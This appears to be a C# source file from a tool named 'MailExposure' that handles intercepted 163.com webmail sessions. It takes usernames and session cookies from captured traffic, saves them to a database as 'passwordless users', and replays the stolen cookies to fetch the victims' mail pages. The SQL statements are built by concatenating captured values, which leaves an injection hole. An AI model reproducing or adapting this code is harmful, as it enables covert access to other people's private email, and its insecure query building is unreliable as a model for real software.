using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.IO;
using System.Web;
using System.Net;
using System.Threading;

namespace MailExposure.PopMailRC
{
    class Filter163mail:displace
    {
        // Fields
        private string urls;
        private int userIndex;

        // Methods
        public Filter163mail(string url, string strCookie, string interceptTime)
        {
            this.urls = "";
            base.url = url;
            base.cookie = strCookie;
            base.strCookie = strCookie;
            base.interceptTime = interceptTime;
        }
        public void loginUser()
        {
            this.userIndex = base.url.IndexOf("username");
            if (this.userIndex != -1)
            {
                base.UserName = base.url.Substring(this.userIndex + 9, base.url.Length - (this.userIndex + 9)).Trim();
                if ((base.UserName != "") && (base.UserName != null))
                {
                    string str = "'" + base.UserName + "'";
                    string str2 = "'" + base.strCookie + "'";
                    string str3 = "'cap163'";
                    string str4 = "'163'";
                    string str5 = "'" + base.interceptTime + "'";
                    string str6 = "'无密用户'";
                    string str7 = "'是'";
                    string strSql = "insert into users(属主,用户名,服务器,服务器地址,方向,邮件地址,验证登陆,时间限制,用户类型,全部接收) values(" + str3 + "," + str + "," + str4 + "," + str4 + "," + str3 + ",'" + base.url + "'," + str2 + "," + str5 + "," + str6 + "," + str7 + ")";
                    string str9 = "select count(*)from users where 服务器地址=" + str4 + "and 用户名=" + str + "and 用户类型=" + str6;
                    string str10 = "update users set 邮件地址='" + this.urls + "',验证登陆=" + str2 + ",时间限制=" + str5;
                    if (Convert.ToInt32(GlobalValue.PopMainForm.ExecuteSQL(str9)) > 0)
                    {
                        str9 = "select 时间限制 from users where 服务器地址=" + str4 + "and 用户名=" + str + "and 用户类型=" + str6;
                        DateTime time = DateTime.Parse(GlobalValue.PopMainForm.ExecuteSQL(str9));
                        if (DateTime.Compare(DateTime.Parse(base.interceptTime), time) > 0)
                        {
                            GlobalValue.PopMainForm.ExecuteSQL(str10);
                            GlobalValue.PopMainForm.listBoxView.Items.Add("[" + base.UserName + "]：修改用户！");
                        }
                    }
                    else
                    {
                        GlobalValue.PopMainForm.ExecuteSQL(strSql);
                        GlobalValue.PopMainForm.listBoxView.Items.Add("[MISS]：添加用户：" + base.UserName);
                    }
                }
            }

        }
        private StringBuilder Request(string url)
        {
            try
            {
                StreamReader reader;
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Accept = "*/*";
                request.AllowAutoRedirect = false;
                request.ServicePoint.Expect100Continue = false;
                request.KeepAlive = true;
                request.UserAgent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)";
                request.ContentType = "application/x-www-form-urlencoded";
                request.Headers.Add("Accept-Language: zh-cn");
                request.Headers.Add("Cookie", base.cookie);
                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                WebHeaderCollection headers = response.Headers;
                if (response.Headers["Set-Cookie"] != null)
                {
                    base.cookie = base.cook(response.Headers["Set-Cookie"]);
                }
                if (headers["Content-Type"] != null)
                {
                    string str = "";
                    str = headers["Content-Type"];
                    if (str.IndexOf("charset=") >= 0)
                    {
                        base.charSet = str.Substring(str.IndexOf("charset=") + 8, (str.Length - str.IndexOf("charset=")) - 8);
                    }
                }
                Thread.Sleep(10);
                if (((response.StatusCode == HttpStatusCode.Found) || (response.StatusCode == HttpStatusCode.MovedPermanently)) || ((response.StatusCode == HttpStatusCode.MovedPermanently) || (response.StatusCode == HttpStatusCode.Found)))
                {
                    this.urls = headers["location"];
                    if (this.urls.IndexOf("http") != -1)
                    {
                        this.Request(this.urls);
                    }
                }
                if ((base.charSet == null) || (base.charSet == "-1"))
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.Default);
                }
                else
                {
                    reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(base.charSet));
                }
                if (base.streamControl)
                {
                    base.MyStringBuilder.Remove(0, base.MyStringBuilder.Length);
                    for (string str2 = reader.ReadLine(); str2 != null; str2 = reader.ReadLine())
                    {
                        base.MyStringBuilder.Append(str2 + "\r\n");
                        str2 = null;
                    }
                    base.streamControl = false;
                }
                reader.Close();
            }
            catch (Exception)
            {
            }
            return base.MyStringBuilder;

        }

    }
}
